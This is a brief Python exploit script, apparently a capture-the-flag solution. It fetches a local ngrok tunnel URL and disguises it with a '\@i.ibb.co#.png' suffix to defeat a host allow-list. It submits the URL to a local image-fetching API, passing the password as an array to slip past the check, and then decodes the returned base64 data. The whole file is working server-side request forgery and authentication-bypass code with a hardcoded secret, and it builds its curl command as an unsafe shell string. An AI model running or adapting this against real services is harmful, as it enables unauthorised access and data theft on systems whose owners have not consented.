import json
import subprocess
import os
import pybase64

os.system("curl  http://localhost:4040/api/tunnels > tunnels.json")

with open('tunnels.json') as data_file:    
    datajson = json.load(data_file)

msg = ""
for i in datajson['tunnels']:
  msg = msg + i['public_url']

url = msg + "\@i.ibb.co#.png"
curl_cmd = "curl -d 'url=" + url + "' -X POST 'http://localhost:2023/api/getImage?password[]=Th!sIsS3xreT0'"
data = subprocess.check_output(curl_cmd, shell=True)
datajson = json.loads(data)
datadecode = pybase64.standard_b64decode(datajson["data"])

print(datadecode)